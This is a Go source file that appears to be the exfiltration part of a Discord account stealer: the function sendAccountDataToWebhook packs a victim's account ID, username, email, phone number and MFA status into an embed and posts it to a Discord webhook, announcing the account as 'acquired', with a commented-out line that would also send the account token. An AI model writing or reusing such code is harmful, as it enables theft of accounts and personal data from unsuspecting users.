package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
)

// I know this is a lot of structs, but basically
// they're all used to generate the webhook payload

type Author struct { // This one is unused
	Name	string	`json:"name"`
	URL		string	`json:"url"`
	IconURL	string	`json:"icon_url"`
}

type Field struct {
	Name	string	`json:"name"`
	Value	string	`json:"value"`
	Inline	bool	`json:"inline,omitempty"`
}

type Thumbnail struct {
	URL	string	`json:"url"`
}

type Image struct { // This one is also unused
	URL	string	`json:"url"`
}

type Footer struct {
	Text	string	`json:"text"`
	IconURL	string	`json:"icon_url"`
}

type Embed struct {
	Author			Author			`json:"author"`
	Title			string			`json:"title"`
	URL				string			`json:"url"`
	Description		string			`json:"description"`
	Color			int				`json:"color"`
	Fields			[]Field			`json:"fields"`
	Thumbnail		Thumbnail		`json:"thumbnail"`
	Image			Image			`json:"image"`
	Footer			Footer			`json:"footer"`
}

type WebhookPayload struct { // This one brings together all the possible webhook components
	Username		string		`json:"username"`
	AvatarURL		string		`json:"avatar_url"`
	Content			string		`json:"content"`
	Embeds			[]Embed		`json:"embeds"`
}

// This function sends account data to a Discord webhook.
// For help understanding Discord webhook payload structure, 
// check out https://birdie0.github.io/discord-webhooks-guide/discord_webhook.html.
// Inputs are a DiscordAccount and a webhook URL.
// Output is an error value if encountered.
func sendAccountDataToWebhook(account DiscordAccount, webhookUrl string) (err error) {
	// Create webhook payload structure
	payload := WebhookPayload{
		Username:	"Account Information Bot",
		AvatarURL:	"https://www.meme-arsenal.com/memes/394fd637ce397d1e24fbca44d99165e4.jpg",
		Content:	"New account, ahem, \"acquired\"!",
		Embeds: []Embed{
			{
				Title:			"ID: " + account.ID,
				Color:			39168,
				Fields: []Field{
					{
						Name:	"Username",
						Value:	account.Username,
						Inline:	true,
					},
					{
						Name:	"Global Name",
						Value:	account.GlobalName,
						Inline:	true,
					},
					{
						Name:	"MFA",
						Value:	strconv.FormatBool(account.MFAEnabled),
					},
					{
						Name:	"Phone",
						Value:	account.Phone,
						Inline:	true,
					},
					{
						Name:	"Email",
						Value:	account.Email,
						Inline:	true,
					},
				},
				Thumbnail: Thumbnail{ // This sets the thumbnail to the user's avatar
					URL: fmt.Sprintf("https://cdn.discordapp.com/avatars/%v/%v.webp", account.ID, account.Avatar),
				},
				Footer: Footer{ // Base64 encode the token in the webhook. Probably not necessary but might as well
					Text:		"This is where the token would go...",
					// Text:		base64EncodeStr(account.Token),
					IconURL:	"https://cdn-icons-png.flaticon.com/128/4382/4382320.png",
				},
			},
		},
	}

	// Create JSON payload from our webhook structure we created
	jsonPayload, err := json.Marshal(payload)
		if err != nil {return fmt.Errorf("could not marshal webhook payload to JSON. msg: %v", err.Error())}

	// Send HTTP POST request to Discord webhook URL
	response, err := http.Post(webhookUrl, "application/json", bytes.NewBuffer(jsonPayload))
		if webhookUrl == "" {return errors.New("webhookUrl is not set")}
		if err != nil {return fmt.Errorf("could not post to webhook. msg: %v", err.Error())}
	defer response.Body.Close()

	// Check response status - assuming anything in 200-399 is fine. Normally returns a 204 upon success 
	if response.StatusCode < 200 || response.StatusCode >= 400 {
		body, err := io.ReadAll(response.Body)
			if err != nil { // Pretty catastrophic error but don't want to assume
				return fmt.Errorf("webhook received status code %v and also could not read response body. awesome :|", response.StatusCode)
			}
		// Include response body with status code to help debugging
		return fmt.Errorf("webhook received http status code %v\n%v", response.StatusCode, string(body))
	}

	// Exit silently upon success
	return nil
}